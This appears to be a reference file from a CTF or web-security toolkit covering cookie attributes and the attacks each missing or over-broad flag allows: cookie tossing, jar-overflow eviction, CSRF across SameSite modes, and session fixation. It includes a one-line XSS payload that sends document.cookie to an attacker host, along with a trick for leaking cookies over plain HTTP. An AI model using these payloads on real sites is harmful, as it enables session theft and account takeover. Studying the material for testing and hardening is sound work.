# Cookie flags — the attribute attack surface

Cookie attributes are the contract between browser and server. Every missing
or over-broad attribute is a bypass primitive; every over-strict one is a
falsifier. This file is the per-attribute reference.

---

## 1. The attribute table

| Attribute | Default | Attack when missing/wrong |
|---|---|---|
| `Secure` | sent over HTTP too | token readable on plain-HTTP redirect/subresource |
| `HttpOnly` | JS-readable | XSS steals session — `document.cookie` |
| `SameSite` | `Lax` in modern Chrome | `None` or unset → CSRF; `Lax` bypass via GET-state-changing |
| `Domain` | exact host | `Domain=.example.com` exposes token to every subdomain |
| `Path` | request path | `Path=/` exposes token to every route incl. attacker page |
| `Expires`/`Max-Age` | session cookie | long-lived → theft persists; no expiry → replay forever |
| `__Host-` prefix | requires `Secure; Path=/; no Domain` | if absent, subdomain can overwrite the cookie |
| `__Secure-` prefix | requires `Secure` | same |
| `Partitioned` (CHIPS) | third-party cookie | top-level site isolation |
| `Priority` | Medium | `High` survives eviction; `Low` evicted first |

## 2. Reading a Set-Cookie header

```
Set-Cookie: session=abc123; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=3600
```

Checklist against this line:

- `Secure` absent → the cookie goes over `http://` too.
- `HttpOnly` absent → XSS = session theft.
- `SameSite=None` **requires** `Secure`; `SameSite=None` + no `Secure` is
  rejected by modern browsers but accepted by older ones and by non-browser
  clients.
- `SameSite` absent → Chrome treats as `Lax`; Firefox/Safari as `None`
  (until recently). Test the actual victim's browser or just test CSRF
  directly.
- `Domain=.example.com` → any subdomain (incl. attacker-controlled
  `x.example.com` via XSS/subdomain-takeover) receives and can overwrite.
- `Domain=example.com` (explicit) → still sent to `www.example.com` etc.
  per the old spec; prefer `__Host-` + no Domain.
- `Path=/admin` on an app cookie → only sent under `/admin`; a login CSRF
  or path-relative link elsewhere drops it.
- `Max-Age` huge / `Expires` far → persistent token; check if it's really
  a session cookie.
- `SameSite=Strict` → even top-level GET navigations drop the cookie —
  kills most CSRF, but a login page may use it to break session fixation.

## 3. Per-attribute attacks

**`Domain` too broad**

```
Set-Cookie: sid=X; Domain=.example.com
```

→ host a page on `xss.example.com` (XSS or takeover), read
`document.cookie` — gets `sid` even though minted on `example.com`.
Or overwrite it: `document.cookie="sid=attacker; Domain=.example.com"` —
session fixation.

**`Secure` missing**

Force a plain-HTTP navigation: `<img src="http://target/anything">` on an
attacker page the victim visits while on the same network, or a captive
portal / SSL-strip. The cookie flies in clear.

**`HttpOnly` missing**

`<script>new Image().src='//you/?c='+document.cookie</script>` — classic
steal. The flag itself may be the cookie.

**`SameSite=None` without need**

Any cross-site form POSTs the session — CSRF against every mutating
endpoint. Confirm with a real cross-origin form submission.

**`Path` too narrow on a "logout"**

`Set-Cookie: sid=; Path=/admin; Max-Age=0` — the logout only kills the
`/admin` copy; the `/` copy (if also set) survives → logout doesn't
logout.

**Cookie tossing**

`attacker.example.com` sets `sid=evil; Domain=.example.com; Path=/` —
browser sends BOTH cookies to `example.com`; server reads the first or the
last depending on parsing → inject your session into victim.

**Cookie overflow/jar eviction**

Set ~180 cookies on the parent domain → the browser evicts the real session
cookie; then set your own. Works on browsers with per-domain cookie caps
(~180 for Chrome).

**`$Version`/legacy quirks**

`Set-Cookie: a=1; $Path=/` on old parsers — rarely relevant in CTF but
exists in the corpus.

## 4. The `__Host-` / `__Secure-` prefixes

- `__Host-sid` **must** have `Secure`, `Path=/`, and **no** `Domain` —
  browsers reject it otherwise. When present and valid, subdomain cookie
  tossing fails: the prefix is the fix.
- `__Secure-sid` **must** have `Secure`.
- A cookie named `__Host-sid` **without** those attributes is rejected by
  modern browsers — the app may silently lose the session. Falsifier:
  the cookie never appears in `document.cookie` nor in requests.

## 5. The SameSite matrix — what actually reaches the server

| Cross-site request | `Strict` | `Lax` | `None`(+Secure) |
|---|---|---|---|
| `<img>` GET | no | no | yes |
| `<form method=GET>` top-nav | no | **yes** | yes |
| `<form method=POST>` top-nav | no | no | yes |
| `fetch` CORS | no | no | yes (with credentials) |
| `fetch` no-CORS | no | no | yes (cookies attached, response unreadable) |
| `iframe` GET | no | no | yes |
| `window.open` GET | no | yes | yes |
| `history.pushState` + XHR | n/a | n/a | n/a |
| WebSocket handshake | no | no | yes (CSWSH) |

`Lax` blocks POST CSRF but NOT top-level GET — a state-changing `GET`
endpoint is still CSRF-able under `Lax`.

## 6. Multi-cookie / ordering quirks

- Two cookies same name, different `Path`: browser sends the more specific
  first. Server's `Cookie` header has both — which wins depends on the
  parser (`request.cookies['x']` takes first, `get_all` sees both,
  `$_COOKIE` takes last in PHP).
- Two cookies same name, different `Domain`: both sent; order by
  specificity then by age.
- Cookie name collision with a path-scoped app cookie can shadow the auth
  cookie — the "cookie shadowing" primitive.

## 7. Verifying flags — http_probe

```bash
python3 tools/web/http_probe.py --challenge "$C" --class web-auth-session \
  --url "$BASE/login" \
  --evidence-regex 'Set-Cookie:[^\n]*' --evidence-kind surface \
  --on-match inconclusive --on-miss inconclusive
```

Flag evidence = the verbatim `Set-Cookie` line; a missing attribute is a
*surface* observation that feeds the CSRF/XSS class — it never confirms
web-auth-session alone.

## 8. Falsifiers

- `Secure; HttpOnly; SameSite=Strict; Path=/; __Host-` prefix, short
  `Max-Age`, `Partitioned` — the hard profile; move to protocol bugs.
- Cookie *missing* attributes that don't matter because the token is
  never used cross-site anyway (e.g., a CSRF token cookie is `SameSite`
  irrelevant).
